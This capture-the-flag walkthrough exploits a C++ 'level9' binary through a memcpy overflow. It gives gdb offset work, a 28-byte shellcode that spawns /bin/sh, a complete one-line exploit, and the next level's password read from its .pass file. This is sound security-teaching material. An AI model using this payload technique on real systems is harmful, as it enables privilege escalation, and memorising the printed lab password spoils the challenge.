# Level 9 - C++ Class Exploitation with Shellcode

## Code Analysis

### Program Structure

The binary is written in **C++** and implements a class `N` containing multiple function attributes. Unlike previous levels, there are no direct calls to `/bin/sh`, requiring us to inject and execute our own shellcode.

### Key Function: setAnnotation(char*)

The critical function is `setAnnotation(char*)`, which:
- Gets called at the end of `main`
- Uses `memcpy` to copy data
- Takes `argv[1]` as input, with length determined by `strlen`

### Exploitation Vector

The program calls the `edx` register in the operator overloads (`-` and `+`). Our goal is to replace the address pointed to by `edx` with the address of our shellcode.

## Finding the Offset

### Determining EAX Offset

Using a cyclic pattern:
```bash
gdb ./level9
run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
```

Using a [pattern generator tool]((https://wiremask.eu/tools/buffer-overflow-pattern-generator/)) reveals the **EAX offset is 108 bytes**.

## Understanding Memory Layout

### Double Dereferencing Requirement

To properly access the C++ class structure, we need **two levels of indirection**:
1. The return address must point to an address
2. That address must point to the start of our shellcode buffer

### Finding Buffer Addresses

Setting a breakpoint to examine memory:
```gdb
(gdb) b *main+136
Breakpoint 1 at 0x804867c
(gdb) run 'AAAA'
Starting program: /home/user/level9/level9 'AAAA'
Breakpoint 1, 0x0804867c in main ()
(gdb) x $eax
0x804a00c:	0x41414141
```

**Key addresses:**
- **Buffer pointer location:** `0x804a00c` (will be overwritten with shellcode address)
- **Shellcode start:** `0x804a00c + 4 = 0x804a010`

**Little-endian representations:**
- Shellcode address: `\x10\xa0\x04\x08`
- Buffer address: `\x0c\xa0\x04\x08`

## Payload Construction

### Payload Structure
```
[shellcode_addr] + [shellcode] + [padding] + [buffer_addr]
     4 bytes         28 bytes     76 bytes      4 bytes     = 112 bytes total
```

### Shellcode Selection

Using a 28-byte shellcode that spawns `/bin/sh`:
```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
```

### Calculating Padding

- Total payload: 108 bytes (to reach EAX offset) + 4 bytes (buffer address) = 112 bytes
- Shellcode address: 4 bytes
- Shellcode: 28 bytes
- Padding needed: 108 - 4 - 28 = **76 bytes**

## Final Exploit
```bash
./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 76 + "\x0c\xa0\x04\x08"')
```

**Payload breakdown:**
1. `\x10\xa0\x04\x08` - Address where shellcode begins (4 bytes)
2. Shellcode - Executable code to spawn shell (28 bytes)
3. `"A" * 76` - Padding to reach offset (76 bytes)
4. `\x0c\xa0\x04\x08` - Address pointing to shellcode pointer (4 bytes)

## Execution Flow

1. `memcpy` copies our payload into the buffer
2. The overwritten pointer at offset 108 points to `0x804a00c`
3. Dereferencing `0x804a00c` yields `0x804a010` (shellcode location)
4. When the program calls through `edx`, it executes our shellcode
5. Shellcode spawns a shell with elevated privileges

## Retrieving the Password
```bash
$ whoami
bonus0
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```

## Credentials

**Username:** bonus0  
**Password:** `f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728`

## Summary

This level introduces **C++ exploitation with shellcode injection**, combining multiple advanced techniques.

**Key concepts:**
- Exploiting C++ class structures and virtual function tables
- Understanding pointer dereferencing in object-oriented contexts
- Calculating precise memory layouts for multi-stage exploitation
- Injecting and executing custom shellcode
- Working with `memcpy` vulnerabilities in C++ programs
- Managing memory addresses without ASLR
- Constructing complex payloads with multiple components

**Critical insight:** C++ exploitation requires understanding object memory layout and vtable mechanics. The double-dereferencing requirement reflects how C++ objects store and access member function pointers, demonstrating that object-oriented languages add complexity to exploitation but don't prevent it.